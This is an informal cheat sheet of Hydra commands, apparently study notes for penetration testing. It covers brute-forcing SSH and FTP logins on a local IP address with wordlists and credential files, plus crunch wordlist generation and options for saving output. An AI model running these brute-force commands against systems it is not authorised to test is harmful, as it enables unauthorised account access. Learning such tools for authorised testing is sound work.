HYDRA 

Install Hydra
sudo apt/nala install hydra

hydra -V
hydra -help 

to find the port on target device : nmap -sV [device ip]

1) Brute forcing SSH

-> SIngle username and pass
hydra -l admin -p admin@123 ssh://192.168.1.100

-> multiplae username and pass
hydra -L user.txt -P pass.txt ssh://192.168.1.100

-> Creds file ( in which user and pass are seperated by colon (i.e admin:admin234) )
hydra -C creds.txt -t 4 -V -f ssh://192.168.1.100

2) Creating wordlists 
CMD : crunch 
SYNTAX : crunch <min> <max>  <charecter set> -o <output file>
<min> and <max> : set the min and max length of words
<charecter set> :  define char to include like, small, capital, number, special char
-o <output file> : save and genrate the wordlist 

EG : crunch 2 4 abc123 -o small.txt


3) Brute forcing FTP
hydra -L user.txt -P pass.txt ftp://192.168.1.100

4) output and formate 
-o <filename> :  to store output in txt file [ EG : hydra -L user.txt -P pass.txt ssh://192.168.1.100 -o result.txt ] 
-b <formate> : to secify the formate of file [ EG : hydra -L user.txt -P pass.txt ssh://192.168.1.100 -b json -o result.json ] 

5) Looping around users 
-u option is used to try simgle pass with mktiple user and single user with multiple passwords 
EG  :  hydra -L user.txt -p admin123 -t 4 -V -f -u ssh://192.168.1.100
EG  :  hydra -L user.txt -P pass.txt -t 4 -V -f -u ssh://192.168.1.100
